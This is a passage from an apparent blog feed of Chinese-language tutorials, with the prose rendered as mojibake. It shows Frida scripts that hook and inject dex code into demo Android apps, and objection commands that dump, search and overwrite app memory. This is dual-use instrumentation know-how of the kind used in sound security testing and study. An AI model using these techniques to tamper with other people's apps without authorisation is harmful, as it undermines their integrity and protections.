class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">onCreate</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141819746.png" alt="img"> </p><h1 id="0x10-HookåŠ¨æ€åŠ è½½dex"><a href="#0x10-HookåŠ¨æ€åŠ è½½dex" class="headerlink" title="0x10 HookåŠ¨æ€åŠ è½½dex"></a>0x10 HookåŠ¨æ€åŠ è½½dex</h1><p>é¦–å…ˆå†™ä¸€ä¸ªä¾›åŠ¨æ€åŠ è½½çš„jaråŒ…æ”¾ç½®åœ¨data&#x2F;data&#x2F;com.zyc.fridademo&#x2F;filesï¼Œåç¼–è¯‘å‡ºæ¥æ˜¯è¿™æ ·çš„</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141820652.png" alt="img"> </p><p>ä¸Šé¢çš„æ¡ˆä¾‹ç¨‹åºä¸­å¤šåŠ ä¸€ä¸ªæŒ‰é’®æ¥ä½¿ç”¨è¯¥jaråŒ…ä¸­ç±»ï¼Œè¯¦ç»†æµç¨‹è‡ªè¡Œå‚è€ƒDexClassLoaderç›¸å…³çŸ¥è¯†ï¼Œè¿™é‡Œåªå±•ç¤ºæŒ‰é’®éƒ¨åˆ†ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> R.id.btn_mydex:</span><br><span class="line">    <span class="comment">//åŠ è½½dex class</span></span><br><span class="line">    <span class="keyword">if</span> (dexClassLoader==<span class="literal">null</span>)&#123; <span class="comment">//ç¡®ä¿åªåˆ›å»ºä¸€ä¸ªDexClassLoaderï¼Œä¸ç„¶å¤šä¸ªloaderå½±å“hook</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">dexPath</span> <span class="operator">=</span> <span class="built_in">this</span>.getFilesDir() + File.separator + <span class="string">&quot;mydex.jar&quot;</span>;</span><br><span class="line">        dexClassLoader = <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(dexPath, <span class="built_in">this</span>.getFilesDir().getAbsolutePath(), <span class="literal">null</span>, getClassLoader());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clz = dexClassLoader.loadClass(<span class="string">&quot;com.zyc.mydex.Human&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">human</span> <span class="operator">=</span> clz.newInstance() ;</span><br><span class="line">        <span class="keyword">if</span> (human != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">say</span> <span class="operator">=</span> clz.getDeclaredMethod(<span class="string">&quot;say&quot;</span>);</span><br><span class="line">            say.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">what</span> <span class="operator">=</span> String.valueOf(say.invoke(human)); <span class="comment">//åå°„è°ƒç”¨sayï¼Œè¿”å›â€œæˆ‘æ˜¯åŠ¨æ€dexâ€</span></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, what, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>åœ¨è·å–loaderæ—¶è®°å¾—ä½¿ç”¨ <strong>try catch</strong>ï¼Œå¦åˆ™loadClass()å‘ç”Ÿå¼‚å¸¸ä¼šå¯¼è‡´ç¨‹åºç»ˆæ­¢ã€‚HookåŠ¨æ€dexçš„å…³é”®åœ¨äºä½¿ç”¨æ­£ç¡®çš„loaderï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">        onMatch : <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(loader.<span class="title function_">loadClass</span>(<span class="string">&quot;com.zyc.mydex.Human&quot;</span>))&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;æ­£ç¡®loader&quot;</span>);</span><br><span class="line">                    <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader;</span><br><span class="line">                    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.mydex.Human&quot;</span>);</span><br><span class="line">                    <span class="title function_">send</span>(clazz);</span><br><span class="line">                    clazz.<span class="property">say</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;æˆ‘æ˜¯è¢«hookçš„åŠ¨æ€dex&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141821105.jpeg" alt="img"> </p><h1 id="0x11-æ‰“å°å‡½æ•°å †æ ˆ"><a href="#0x11-æ‰“å°å‡½æ•°å †æ ˆ" class="headerlink" title="0x11 æ‰“å°å‡½æ•°å †æ ˆ"></a>0x11 æ‰“å°å‡½æ•°å †æ ˆ</h1><p>æ‰“å°å‡½æ•°å †æ ˆçš„å…³é”®åœ¨äº <strong>android.util.Log.getStackTraceString(new Throwable())</strong> æˆ– <strong>android.util.Log.getStackTraceString(new Exception())</strong> ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥è¿™æ ·Hookï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc&quot;</span>);</span><br><span class="line">    clazz.<span class="property">add</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">num</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> log = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> throwable = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> stack = log.<span class="title function_">getStackTraceString</span>(throwable.$new());</span><br><span class="line">        <span class="title function_">send</span>(stack);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">add</span>(num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼Œå¯ä»¥çœ‹åˆ°é™¤ç³»ç»Ÿè°ƒç”¨å¤–ï¼Œæ‰§è¡Œæµç¨‹ä¸º <strong>MainActivity.onCreate -&gt; Calc.add()</strong> ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141823531.gif" alt="img"> </p><h1 id="0x12-æ³¨å…¥dexæ–‡ä»¶"><a href="#0x12-æ³¨å…¥dexæ–‡ä»¶" class="headerlink" title="0x12 æ³¨å…¥dexæ–‡ä»¶"></a>0x12 æ³¨å…¥dexæ–‡ä»¶</h1><p>å½“ç¨‹åºæœ¬èº«åŠŸèƒ½ä¸èƒ½æ»¡è¶³æˆ‘ä»¬éœ€æ±‚æ—¶ï¼Œå¦‚æœè¦åˆ©ç”¨fridaå¢åŠ åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢æ–¹æ³•ï¼š</p><ul><li><strong>Java.registerClass</strong> æ³¨å…¥è‡ªå·±çš„ç±»ï¼Œéœ€è¦ä½¿ç”¨jsæ’°å†™ä¸€ä¸ªjavaç±»ä¼ å…¥ã€‚</li><li><strong>Java.openClassFile</strong> æ³¨å…¥è‡ªå·±çš„dexæ–‡ä»¶ï¼Œåªéœ€ä¼ å…¥dexè·¯å¾„ã€‚</li></ul><p>æ˜¾ç„¶ï¼Œæ³¨å…¥dexæ–‡ä»¶ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚é‚£ä¹ˆç°åœ¨æˆ‘å†™ä¸€ä¸ªç®€å•çš„ç±»æ‰“åŒ…åæå–å…¶dexæ”¾ç½®ä¸º &#x2F;data&#x2F;local&#x2F;tmp&#x2F;injectiondex.dexï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zyc.injectiondex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;å–µå–µå–µ&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;å¤šåƒå‡ å£&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨fridaæ³¨å…¥ä¹‹å‰çš„å†…éƒ¨ç±»æ–¹æ³•ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/injectiondex.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">    <span class="keyword">var</span> cat = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.injectiondex.Cat&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> oneCat = cat.$new();</span><br><span class="line">    <span class="keyword">var</span> catsay = oneCat.<span class="title function_">say</span>();</span><br><span class="line">    <span class="keyword">var</span> cateat = oneCat.<span class="title function_">eat</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> innerClazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc$InnerClass&quot;</span>);</span><br><span class="line">    innerClazz.<span class="property">print</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> catsay+cateat;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141824157.gif" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>objectionå·¥å…·ä½¿ç”¨</title>
      <link href="/2024/07/10/objection%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/07/10/objection%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-å®‰è£…"><a href="#0x01-å®‰è£…" class="headerlink" title="0x01 å®‰è£…"></a>0x01 å®‰è£…</h1><p>ä¸‹è½½åœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/sensepost/objection/releases</span><br></pre></td></tr></table></figure><p>ç°åœ¨æœ€æ–°ç‰ˆçš„<code>objection</code>ä¸º1.11.0</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101056146.png" alt="image-20240710105651985"> </p><p><code>objection</code>æ˜¯é€šè¿‡<code>Frida</code>æ¥æä¾›æœåŠ¡çš„ï¼Œæ‰€ä»¥å®‰è£…<code>objection</code>ä¹‹å‰è¦å…ˆå®‰è£…<code>frida</code>ã€‚</p><hr><p>æŒ‰ç…§æ¨èç‰ˆæœ¬æ¥åšï¼šï¼ˆ<strong>è¿™å—Pythonç‰ˆæœ¬ä½¿ç”¨3.7çš„ï¼Œä¸ç„¶åé¢è‚¯ä¼šæŠ¥é”™</strong>ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida 12.8.0</span><br><span class="line">frida-tools  5.3.0</span><br><span class="line">objection  1.8.4</span><br><span class="line">jnitrace  3.0.8</span><br></pre></td></tr></table></figure><p>æƒ³è¦ä½¿ç”¨åŸºäºfridaç‰ˆæœ¬çš„objectionï¼Œåªéœ€è¦å®‰è£…å¥½ç‰¹å®šç‰ˆæœ¬çš„fridaå’Œfrida-toolsï¼Œå†å»objectionçš„releasesé‡Œé¢æ‰¾é‚£ä¸ªæ—¥æœŸä¹‹å‰ä¸€ç‚¹ç‚¹çš„ç‰ˆæœ¬å³å¯ï¼Œæ¯”å¦‚ä»¥frida 12.8.0 ç‰ˆæœ¬ä¸ºä¾‹ï¼š</p><p>1ã€é¦–å…ˆå®‰è£…ç‰¹å®šç‰ˆæœ¬çš„ frida</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip  install frida==12.8.0</span><br><span class="line">pip  install  frida-tools==5.3.0</span><br></pre></td></tr></table></figure><p>2ã€ç„¶åï¼Œå®‰è£…objection</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip  install  objection==1.8.4</span><br></pre></td></tr></table></figure><p>3ã€fridaé…ç½®åˆ°æ‰‹æœº</p><p>æŸ¥çœ‹Androidæ‰‹æœºè®¾å¤‡è®¾ç½®   <strong>getprop   ro.product.cpu.abi</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101101628.png" alt="img"> </p><p>æ®cpuç‰ˆæœ¬å»ä¸‹è½½ç›¸åº”<a href="https://links.jianshu.com/go?to=https://github.com/frida/frida/releases">frida-server</a>,æ‰‹æœºæ˜¯x86_64çš„ï¼Œæ‰¾åˆ°ç›¸åº”çš„æœåŠ¡å™¨server,å¦‚ä¸‹</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101101977.png" alt="image.png"> </p><p>å°†frida-serverä¸‹è½½ä¸‹æ¥ï¼Œè§£å‹å‡ºæ¥ï¼Œä¸ºäº†ç®€å•ï¼Œé‡å‘½åä¸ºå°†frida-serverä¸‹è½½ä¸‹æ¥ï¼ŒåŠ å‹å‡ºæ¥ï¼Œä¸ºäº†ç®€å•ï¼Œé‡å‘½åä¸ºfrida-server64ï¼Œå°†æ”¾åˆ°æ‰‹æœºï¼Œå¹¶è¿›è¡Œç«¯å£è½¬å‘ï¼Œè¿è¡Œfridaï¼Œå°†æ”¾åˆ°æ‰‹æœºï¼Œå¹¶è¿›è¡Œç«¯å£è½¬å‘ï¼Œè¿è¡Œfrida</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\frida</span><br><span class="line">Î» adb push frida-serverx86 /data/local/tmp</span><br><span class="line">frida-serverx86: 1 file pushed. 6.7 MB/s (28209380 bytes in 3.992s)</span><br><span class="line"></span><br><span class="line">E:\frida</span><br><span class="line">Î» adb shell</span><br><span class="line">root@aosp:/ # cd /</span><br><span class="line">root@aosp:/ # cd data/local/tmp/</span><br><span class="line">root@aosp:/data/local/tmp # chmod 777 frida-serverx86</span><br><span class="line">root@aosp:/data/local/tmp # ./frida-serverx86</span><br><span class="line">WARNING: linker: ./frida-serverx86: unused DT entry: type 0x6ffffef5 arg 0x1c60</span><br></pre></td></tr></table></figure><p>è¿è¡Œ <strong>frida-ps -U</strong> æŸ¥çœ‹æ˜¯å¦æ­£å¸¸è¿è¡Œ</p><p>4ã€æ’é”™</p><p>è¿™å—å®‰è£…å¥½åï¼Œç›´æ¥è¿è¡Œfridaæˆ–è€…objectionä¼šæŠ¥é”™ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p><p><a href="https://blog.csdn.net/weixin_43205308/article/details/130830307">è§£å†³python urllib3 v2.0 only supports OpenSSL 1.1.1+, currently-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/guo343310267/article/details/88343025">windowså®‰è£…fridaè¿è¡Œç¯å¢ƒ_failed to load the frida native extension-CSDNåšå®¢</a></p><p>5ã€å®‰è£…æˆåŠŸ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101102643.png" alt="image.png"> </p><p>ã€æ³¨æ„ã€‘æœ‰çš„APPåº”ç”¨å¯èƒ½ä¼šå¯¹fridaé»˜è®¤çš„ç«¯å£åšæ£€æµ‹ï¼Œè¿™é‡Œå¯ä»¥é€‰ç”¨ä¸€ä¸ªä¸å¸¸ç”¨çš„ç«¯å£ï¼Œå¦‚7777</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frida-server  -l 0.0.0.0:7777</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101103143.png" alt="image.png"> </p><h1 id="0x02-objectionå‘½ä»¤è¯¦è§£"><a href="#0x02-objectionå‘½ä»¤è¯¦è§£" class="headerlink" title="0x02  objectionå‘½ä»¤è¯¦è§£"></a>0x02  objectionå‘½ä»¤è¯¦è§£</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objection -g com.zj.wuaipojie -d explore   //objectionè¿æ¥åˆ°è¦é™„åŠ çš„APPè¿›ç¨‹</span><br><span class="line">-g:åé¢è·ŸåŒ…å</span><br><span class="line">-d:è¾“å‡ºè°ƒè¯•ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101105072.png" alt="image.png"> </p><p>è¾“å…¥ â€œç©ºæ ¼â€ å¯ä»¥å‘ç°é‡Œé¢å†…ç½®çš„ä¸€äº›å‘½ä»¤ï¼Œå¦‚fridaã€envç­‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101105873.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101105141.png" alt="image.png"> </p><p>import  xxx.js  &#x2F;&#x2F;å¯¼å…¥fridaçš„è„šæœ¬</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101106897.png" alt="image.png"> </p><h2 id="memoryæ¨¡å—"><a href="#memoryæ¨¡å—" class="headerlink" title="memoryæ¨¡å—"></a>memoryæ¨¡å—</h2><h3 id="åˆ—å‡ºå†…å­˜ä¸­åŠ è½½çš„åº“"><a href="#åˆ—å‡ºå†…å­˜ä¸­åŠ è½½çš„åº“" class="headerlink" title="åˆ—å‡ºå†…å­˜ä¸­åŠ è½½çš„åº“"></a>åˆ—å‡ºå†…å­˜ä¸­åŠ è½½çš„åº“</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memory list modules  //åˆ—å‡ºå†…å­˜ä¸­åŠ è½½çš„åº“</span><br><span class="line"></span><br><span class="line">å¦‚æœè¦æŠŠç»“æœä»¥jsonæ ¼å¼è¾“å‡ºåˆ°æœ¬åœ°å¯ä»¥åœ¨æŒ‡ä»¤åæ·»åŠ å‚æ•°ï¼š</span><br><span class="line">memory list modules --json /root/modules.json</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101110308.png" alt="image.png"> </p><h3 id="åˆ—å‡ºæŸä¸ªåº“çš„å¯¼å‡ºå‡½æ•°"><a href="#åˆ—å‡ºæŸä¸ªåº“çš„å¯¼å‡ºå‡½æ•°" class="headerlink" title="åˆ—å‡ºæŸä¸ªåº“çš„å¯¼å‡ºå‡½æ•°"></a>åˆ—å‡ºæŸä¸ªåº“çš„å¯¼å‡ºå‡½æ•°</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memory list exports  xxx   //åˆ—å‡ºæŸä¸ªåº“çš„å¯¼å‡ºå‡½æ•°</span><br><span class="line"></span><br><span class="line">memory list exports &quot;libbinder.so&quot;   //è¿™å—åˆ—å‡º libbinder.so æ–‡ä»¶çš„å¯¼å‡ºå‡½æ•°</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101111758.png" alt="image.png"> </p><h3 id="æå–å†…å­˜æ•°æ®"><a href="#æå–å†…å­˜æ•°æ®" class="headerlink" title="æå–å†…å­˜æ•°æ®"></a>æå–å†…å­˜æ•°æ®</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æå–å†…å­˜æ•°æ®</span><br><span class="line">memory dump from_base 0x12fc9c78 9 /root/memory.txt</span><br><span class="line">//ä»å†…å­˜ä¸­æå–å…¶åœ°å€ä¸º 0x12fc9c78 é•¿åº¦ä¸º 9bit çš„æ•°æ®</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101113370.jpeg" alt="img"> </p><h3 id="æœç´¢å†…å­˜æ•°æ®"><a href="#æœç´¢å†…å­˜æ•°æ®" class="headerlink" title="æœç´¢å†…å­˜æ•°æ®"></a>æœç´¢å†…å­˜æ•°æ®</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœç´¢å†…å­˜æ•°æ®</span><br><span class="line">æƒ³æ‰¾åˆ°â€œaaaqqqâ€è¿è¡Œ</span><br><span class="line">memory search &quot;61 61 61 71 71 71&quot;</span><br><span class="line">æˆ–è€…æ¨¡ç³Šæœç´¢</span><br><span class="line">memory search &quot;61 61 61 71&quot;ã€memory search &quot;61 61 61 ?? ?? 71&quot;ã€‚</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101114408.jpeg" alt="img"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¹Ÿå¯ä»¥å¢åŠ å‚æ•°é€šè¿‡å­—ç¬¦ä¸²æœç´¢ï¼Œè¿è¡Œmemory search &quot;aaaqqq&quot; --stringï¼Œæ­¤æ–¹å¼ä¸æ”¯æŒæ¨¡ç³Šæœç´¢</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101114255.jpeg" alt="img"> </p><h3 id="å†™å…¥å†…å­˜æ•°æ®"><a href="#å†™å…¥å†…å­˜æ•°æ®" class="headerlink" title="å†™å…¥å†…å­˜æ•°æ®"></a>å†™å…¥å†…å­˜æ•°æ®</h3><p>é€šè¿‡å†…å­˜åœ°å€å¯ä»¥å†™å…¥æ•°æ®ï¼Œæ¯”å¦‚æœç´¢TextViewçš„æ–‡å­—â€œHellowordâ€å¹¶é€šè¿‡memory write 0x12fc9c78 â€˜61 61 61â€™ä¿®æ”¹å…¶ä¸­ä¸€å¤„ç»“æœï¼Œå†æŠŠè¿›ç¨‹åˆ‡æ¢ä¸€ä¸‹åå°&amp;å‰å°ï¼Œå°±åˆ·æ–°æˆä¿®æ”¹çš„æ•°æ®äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memory write 0x12fc9c78 &#x27;61 61 61&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101114112.gif" alt="img"> </p><h2 id="Androidæ¨¡å—ï¼ˆå¸¸ç”¨ï¼‰"><a href="#Androidæ¨¡å—ï¼ˆå¸¸ç”¨ï¼‰" class="headerlink" title="Androidæ¨¡å—ï¼ˆå¸¸ç”¨ï¼‰"></a>Androidæ¨¡å—ï¼ˆå¸¸ç”¨ï¼‰</h2><h3 id="åˆ—å‡ºå†…å­˜ä¸­åŠ è½½çš„æ‰€æœ‰ç±»"><a href="#åˆ—å‡ºå†…å­˜ä¸­åŠ è½½çš„æ‰€æœ‰ç±»" class="headerlink" title="åˆ—å‡ºå†…å­˜ä¸­åŠ è½½çš„æ‰€æœ‰ç±»"></a>åˆ—å‡ºå†…å­˜ä¸­åŠ è½½çš„æ‰€æœ‰ç±»</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101117083.png" alt="image.png"> </p><h3 id="åˆ—å‡ºæŒ‡å®šç±»çš„æ‰€æœ‰æ–¹æ³•"><a href="#åˆ—å‡ºæŒ‡å®šç±»çš„æ‰€æœ‰æ–¹æ³•" class="headerlink" title="åˆ—å‡ºæŒ‡å®šç±»çš„æ‰€æœ‰æ–¹æ³•"></a>åˆ—å‡ºæŒ‡å®šç±»çš„æ‰€æœ‰æ–¹æ³•</h3><p>å‡è®¾è¦æŸ¥çœ‹APP MainActivity ç±»çš„æ–¹æ³•ï¼Œè¿è¡Œandroid hooking list class_methods com.zyc.objectiondemo.MainActivityï¼Œå¯ä»¥çœ‹åˆ°åªæ‰“å°äº†å±äºè¯¥ç±»çš„æ–¹æ³•ï¼Œç»§æ‰¿æ¥çš„å¹¶ä¸ä¼šæ‰“å°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking class com.zyc.objectiondemo.MainActivity</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101122483.jpeg" alt="img"> </p><h3 id="åœ¨å†…å­˜ä¸­æ‰€æœ‰çš„ç±»é‡Œæœç´¢ç±»"><a href="#åœ¨å†…å­˜ä¸­æ‰€æœ‰çš„ç±»é‡Œæœç´¢ç±»" class="headerlink" title="åœ¨å†…å­˜ä¸­æ‰€æœ‰çš„ç±»é‡Œæœç´¢ç±»"></a>åœ¨å†…å­˜ä¸­æ‰€æœ‰çš„ç±»é‡Œæœç´¢ç±»</h3><p>ä»å·²åŠ è½½çš„ç±»é‡ŒæŸ¥æ‰¾å’Œâ€œzycâ€å…³é”®å­—ï¼Œè¿è¡Œandroid hooking search classes zycã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking search classes zyc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101128321.jpeg" alt="img"> </p><h3 id="åœ¨æ‰€æœ‰ç±»ä¸­æœç´¢æŒ‡å®šæ–¹æ³•"><a href="#åœ¨æ‰€æœ‰ç±»ä¸­æœç´¢æŒ‡å®šæ–¹æ³•" class="headerlink" title="åœ¨æ‰€æœ‰ç±»ä¸­æœç´¢æŒ‡å®šæ–¹æ³•"></a>åœ¨æ‰€æœ‰ç±»ä¸­æœç´¢æŒ‡å®šæ–¹æ³•</h3><p>å‡è®¾è¦æœç´¢å¸¦â€œonCreateâ€çš„æ–¹æ³•ï¼Œè¿è¡Œandroid hooking search methods onCreateã€‚è¯¥æŒ‡ä»¤ä¼šéå†å†…å­˜ä¸­æ‰€æœ‰å·²åŠ è½½ç±»çš„æ‰€æœ‰æ–¹æ³•æ‰§è¡Œæœç´¢ï¼Œæ•°æ®é‡éå¸¸å¤§ï¼Œè¿‡ç¨‹ç›¸å½“è€—æ—¶ï¼Œç”šè‡³å®¹æ˜“å¡æ­»å’Œå´©æºƒï¼Œæ‰€ä»¥ä¼šåœ¨è¿è¡Œå‰æ‰‹åŠ¨è¾“å…¥â€œyâ€åŒæ„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking search methods onCreate</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101129196.jpeg" alt="img"> </p><h3 id="åˆ—å‡ºæ‰€æœ‰Activityã€Serviceã€Receiver"><a href="#åˆ—å‡ºæ‰€æœ‰Activityã€Serviceã€Receiver" class="headerlink" title="åˆ—å‡ºæ‰€æœ‰Activityã€Serviceã€Receiver"></a>åˆ—å‡ºæ‰€æœ‰Activityã€Serviceã€Receiver</h3><p>æŸ¥çœ‹APPçš„ç»„ä»¶ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking list activities</span><br><span class="line">android hooking list services</span><br><span class="line">android hooking list receivers</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101333830.jpeg" alt="img"> </p><p>ï¼ˆ1ï¼‰å¯åŠ¨<code>activity</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android intent launch_activity com.md.obj.ui.PlayerActivity</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å¯åŠ¨<code>services</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android intent launch_service [services_class]  </span><br></pre></td></tr></table></figure><h3 